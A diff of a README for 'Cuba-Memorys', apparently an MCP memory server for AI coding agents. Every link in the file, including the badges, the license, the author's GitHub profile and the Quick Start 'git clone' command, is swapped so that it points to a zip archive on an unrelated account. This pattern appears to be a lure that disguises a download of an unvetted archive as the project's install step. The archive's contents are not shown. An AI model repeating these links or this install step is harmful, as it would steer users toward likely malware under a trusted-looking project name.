@@ -1,12 +1,12 @@
 # 🧠 Cuba-Memorys
 
-[![Rust](https://img.shields.io/badge/rust-1.93+-orange?logo=rust&logoColor=white)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![License: CC BY-NC 4.0](https://img.shields.io/badge/license-CC%20BY--NC%204.0-green)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![Version](https://img.shields.io/badge/version-2.0.0-blue)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-18-336791?logo=postgresql&logoColor=white)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![MCP](https://img.shields.io/badge/MCP-compatible-8A2BE2)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![Audit](https://img.shields.io/badge/audit-GO-brightgreen)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
-[![Tech Debt](https://img.shields.io/badge/tech%20debt-0-brightgreen)](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
+[![Rust](https://img.shields.io/badge/rust-1.93+-orange?logo=rust&logoColor=white)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![License: CC BY-NC 4.0](https://img.shields.io/badge/license-CC%20BY--NC%204.0-green)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![Version](https://img.shields.io/badge/version-2.0.0-blue)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-18-336791?logo=postgresql&logoColor=white)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![MCP](https://img.shields.io/badge/MCP-compatible-8A2BE2)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![Audit](https://img.shields.io/badge/audit-GO-brightgreen)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
+[![Tech Debt](https://img.shields.io/badge/tech%20debt-0-brightgreen)](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
 
 **Persistent memory for AI agents** — A Model Context Protocol (MCP) server that gives AI coding assistants long-term memory with a knowledge graph, neuroscience-inspired algorithms, and anti-hallucination grounding.
 
@@ -61,7 +61,7 @@ AI agents forget everything between conversations. Cuba-Memorys solves this:
 ## Quick Start
 
 ```bash
-git clone https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip
+git clone https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip
 cd cuba-memorys
 
 # Start PostgreSQL
@@ -369,7 +369,7 @@ After 20 reviews:     S = 45.0 (survives ~13 months)
 
 ## License
 
-[CC BY-NC 4.0](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip) — Free to use and modify, **not for commercial use**.
+[CC BY-NC 4.0](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip) — Free to use and modify, **not for commercial use**.
 
 ---
 
@@ -377,7 +377,7 @@ After 20 reviews:     S = 45.0 (survives ~13 months)
 
 **Leandro Pérez G.**
 
-- GitHub: [@LeandroPG19](https://raw.githubusercontent.com/gbh3247872997-del/cuba-memorys/main/rust/src/graph/cuba_memorys_3.9-beta.5.zip)
+- GitHub: [@LeandroPG19](https://github.com/gbh3247872997-del/cuba-memorys/raw/refs/heads/main/rust/examples/memorys-cuba-v3.6.zip)
 - Email: [leandropatodo@gmail.com](mailto:leandropatodo@gmail.com)
 
 ## Credits
